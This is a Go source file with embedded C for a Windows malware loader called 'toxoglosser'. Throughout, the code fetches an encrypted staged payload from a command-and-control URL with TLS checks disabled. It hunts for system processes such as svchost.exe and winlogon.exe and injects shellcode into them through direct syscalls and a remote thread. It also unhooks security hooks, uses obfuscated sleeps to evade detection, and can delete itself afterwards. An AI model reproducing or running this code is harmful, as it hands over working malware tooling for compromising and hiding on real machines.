// toxoglosser.go (Enhanced version with staged loading as the primary approach)
package main

/*
#cgo LDFLAGS: -lpsapi -lntdll
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winnt.h>
#include <ntstatus.h>

// Enhanced function to get process ID by name with additional checks
DWORD GetProcessIdByNameEnhanced(const char* processName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	BOOL bResult = Process32First(hSnapshot, &pe32);

	while (bResult) {
		if (_stricmp(pe32.szExeFile, processName) == 0) {
			CloseHandle(hSnapshot);
			return pe32.th32ProcessID;
		}
		bResult = Process32Next(hSnapshot, &pe32);
	}

	CloseHandle(hSnapshot);
	return 0;
}

// Function to check if a process is suitable for injection
BOOL IsProcessSuitable(DWORD pid) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL) {
		return FALSE;
	}

	// Check architecture (ensure it matches)
	BOOL isWow64;
	IsWow64Process(hProcess, &isWow64);
	if (isWow64) {
		// Skip 32-bit processes on 64-bit system if targeting 64-bit
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);
	return TRUE;
}
*/
import "C"
import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
	"strings"

	"toxoglosser/core"
	"toxoglosser/evasion"
	"toxoglosser/payloads"
	"toxoglosser/utils"
)

// Global variables for configuration
var (
	defaultProcessList = []string{
		"explorer.exe",
		"svchost.exe",
		"services.exe",
		"spoolsv.exe",
		"winlogon.exe",
		"dwm.exe",
		"csrss.exe",
	}
)

const (
	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xFFF
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

// Function to perform environment checks for evasions
func performEnvironmentChecks() bool {
	// Use enhanced evasion techniques
	err := evasion.UnhookAll() // Updated to use unhooking method
	if err != nil {
		fmt.Printf("[-] Evasion techniques failed: %v\n", err)
		// Continue anyway since this is not critical
	}

	fmt.Println("[+] Environment checks and evasions passed")
	return true
}

// Enhanced injection function with better error handling
func injectEnhanced(pid C.DWORD, processName string, payload []byte) bool {
	if pid == 0 {
		fmt.Fprintf(os.Stderr, "[-] Could not find process '%s'.\n", processName)
		return false
	}

	fmt.Printf("[+] Found target process '%s' with PID: %d\n", processName, int(pid))

	// Open the target process with ALL_ACCESS rights
	hProcess, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open process %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	defer syscall.CloseHandle(hProcess)
	fmt.Printf("[+] Obtained handle to process %s (%d)\n", processName, int(pid))

	// Use direct syscalls instead of LazyDLL
	// Allocate memory in target process for shellcode
	addr := uintptr(0)
	size := uintptr(len(payload))
	err = core.NtAllocateVirtualMemory(hProcess, &addr, 0, &size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory in %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	shellcodeAddr := addr
	fmt.Printf("[+] Allocated %d bytes at 0x%x in %s (%d)\n", len(payload), shellcodeAddr, processName, int(pid))

	// Write shellcode to target process using direct syscall
	err = core.NtWriteVirtualMemory(hProcess, shellcodeAddr, unsafe.Pointer(&payload[0]), uintptr(len(payload)), nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to write shellcode to %s (%d): %v\n", processName, int(pid), err)
		return false
	}
	fmt.Printf("[+] Wrote %d bytes of shellcode to %s (%d)\n", len(payload), processName, int(pid))

	// Change memory protection to RX (Read-Execute) using direct syscall
	oldProtect := uint32(0)
	err = core.NtProtectVirtualMemory(hProcess, &shellcodeAddr, &size, PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to change memory protection in %s (%d): %v\n", processName, int(pid), err)
		return false
	}

	// Create remote thread to execute shellcode using CreateRemoteThread via manual resolution
	createRemoteThreadAddr, err := core.ManualGetProcAddress("kernel32.dll", "CreateRemoteThread")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to resolve CreateRemoteThread: %v\n", err)
		return false
	}

	hThread, _, threadErr := syscall.Syscall6(
		createRemoteThreadAddr,
		6,
		uintptr(hProcess),
		0,
		0,
		shellcodeAddr, // Start of the shellcode
		0,
		0,
	)

	if hThread == 0 {
		fmt.Fprintf(os.Stderr, "[-] Failed to create remote thread in %s (%d): %v\n", processName, int(pid), threadErr)
		return false
	}

	fmt.Printf("[+] Payload injected into %s (%d). Mission accomplished.\n", processName, int(pid))
	return true
}

// DownloadPayloadFromStaged fetches payload from C2 with basic encryption
func DownloadPayloadFromStaged(url string, key string) ([]byte, error) {
	// Create HTTP client with TLS config to avoid basic detections
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}

	fmt.Printf("[*] Downloading staged payload from: %s\n", url)
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	payload, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if len(payload) == 0 {
		return nil, fmt.Errorf("received empty payload")
	}

	// If key is provided, attempt to decrypt
	if key != "" && len(key) > 0 {
		fmt.Println("[*] Decrypting staged payload...")
		keyBytes := make([]byte, 32) // AES-256
		copy(keyBytes, []byte(key))
		
		decrypted, err := payloads.DecryptPayload(payload, keyBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt payload: %v", err)
		}
		payload = decrypted
	}

	return payload, nil
}

// Function to select appropriate process from a list
func selectProcess(processList []string) C.DWORD {
	for _, processName := range processList {
		fmt.Printf("[*] Hunting for '%s'...\n", processName)
		pid := C.GetProcessIdByNameEnhanced(C.CString(processName))
		if pid != 0 && C.IsProcessSuitable(uint32(pid)) != 0 {
			fmt.Printf("[+] Found suitable process: %s (PID: %d)\n", processName, int(pid))
			return pid
		}
	}
	return 0
}

// Function to profile a process before injection
func profileProcess(pid C.DWORD, processName string) bool {
	fmt.Printf("[*] Profiling process %s (PID: %d) before injection\n", processName, int(pid))

	// Simulate profiling delay
	utils.AdvancedSleepWithObfuscation(500 * time.Millisecond)

	return true
}

func main() {
	// Perform initial environment checks and evasions
	if !performEnvironmentChecks() {
		os.Exit(1)
	}

	// Use obfuscated sleep to avoid detection
	utils.AdvancedSleepWithObfuscation(2 * time.Second)

	if runtime.GOARCH != "amd64" {
		fmt.Fprintln(os.Stderr, "[-] This tool requires an x64 architecture.")
		os.Exit(1)
	}

	// --- Command-line flag parsing ---
	stageURL := flag.String("url", "", "URL to fetch the STAGED payload from (required).")
	stageKey := flag.String("key", "", "Key to decrypt staged payload if encrypted.")
	targetProcessName := flag.String("pname", "", "Name of the target process.")
	targetPidFlag := flag.Int("pid", 0, "PID of the target process.")
	verbose := flag.Bool("v", false, "Enable verbose output.")
	
	// Add flag for alternative process hunting
	alternativeHunt := flag.Bool("ah", false, "Use alternative process hunting technique.")
	selfDelete := flag.Bool("selfdelete", false, "Delete the executable after execution.")
	
	// Optional fallback to file if URL is unavailable
	payloadFile := flag.String("file", "", "Path to the shellcode file to execute (fallback).")

	flag.Parse()

	if *verbose {
		fmt.Println("[*] Verbose mode enabled")
	}

	// --- Payload selection - STAGED approach is now primary ---
	var payload []byte
	var err error

	// Primary: Staged payload from URL
	if *stageURL != "" {
		payload, err = DownloadPayloadFromStaged(*stageURL, *stageKey)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to download staged payload: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Successfully downloaded and processed staged payload (%d bytes)\n", len(payload))
	} else if *payloadFile != "" {
		// Fallback: Local file
		fmt.Printf("[*] Loading payload from file (fallback): %s\n", *payloadFile)
		payload, err = ioutil.ReadFile(*payloadFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode file: %v\n", err)
			os.Exit(1)
		}
	} else {
		// No payload source provided
		fmt.Fprintln(os.Stderr, "[-] No payload source provided. Use -url to specify a staged payload URL.")
		os.Exit(1)
	}

	if len(payload) == 0 {
		fmt.Fprintln(os.Stderr, "[-] No shellcode to execute. Staged payload download failed.")
		os.Exit(1)
	}

	// Verify payload looks like valid shellcode (basic check)
	if len(payload) < 10 {
		fmt.Fprintln(os.Stderr, "[-] Payload too small to be valid shellcode (< 10 bytes)")
		os.Exit(1)
	}

	// --- Target process selection and injection ---
	injected := false

	// Shuffle the default process list to avoid predictable patterns
	shuffledProcesses := make([]string, len(defaultProcessList))
	copy(shuffledProcesses, defaultProcessList)
	if *alternativeHunt {
		// Use a different order for alternative hunting
		for i := len(shuffledProcesses) - 1; i > 0; i-- {
			j := int(time.Now().UnixNano()) % (i + 1)
			shuffledProcesses[i], shuffledProcesses[j] = shuffledProcesses[j], shuffledProcesses[i]
		}
	}

	if *targetPidFlag != 0 {
		// Target a specific PID
		pid := C.DWORD(*targetPidFlag)
		if profileProcess(pid, fmt.Sprintf("PID:%d", pid)) {
			injected = injectEnhanced(pid, fmt.Sprintf("PID:%d", pid), payload)
		}
	} else if *targetProcessName != "" {
		// Target a specific process name
		pid := C.GetProcessIdByNameEnhanced(C.CString(*targetProcessName))
		if pid != 0 && C.IsProcessSuitable(uint32(pid)) != 0 && profileProcess(pid, *targetProcessName) {
			injected = injectEnhanced(pid, *targetProcessName, payload)
		}
	} else {
		// Hunt for a suitable process from the shuffled list
		fmt.Println("[*] No target specified. Hunting for a suitable process...")
		pid := selectProcess(shuffledProcesses)

		if pid != 0 {
			// Get the process name for profiling
			var targetName string
			for _, name := range shuffledProcesses {
				if C.GetProcessIdByNameEnhanced(C.CString(name)) == pid && C.IsProcessSuitable(uint32(pid)) != 0 {
					targetName = name
					break
				}
			}

			if targetName != "" && profileProcess(pid, targetName) {
				if injectEnhanced(pid, targetName, payload) {
					injected = true
				}
			}
		}
	}

	if !injected {
		fmt.Fprintln(os.Stderr, "[-] Injection failed. No suitable target process was found or could be injected into.")
		os.Exit(1)
	}

	// Add some delay to avoid immediate detection
	if *verbose {
		fmt.Println("[*] Injection completed successfully, exiting after delay")
	}
	utils.AdvancedSleepWithObfuscation(1000 * time.Millisecond)

	// Self-delete if the flag was set
	if *selfDelete {
		fmt.Println("[*] Attempting self-deletion...")
		err := utils.SelfDeleteImmediate()
		if err != nil {
			// Don't fail if self-deletion fails, just warn
			fmt.Printf("[-] Self-deletion failed: %v\n", err)
		} else {
			fmt.Println("[+] Scheduled for self-deletion")
		}
	}
}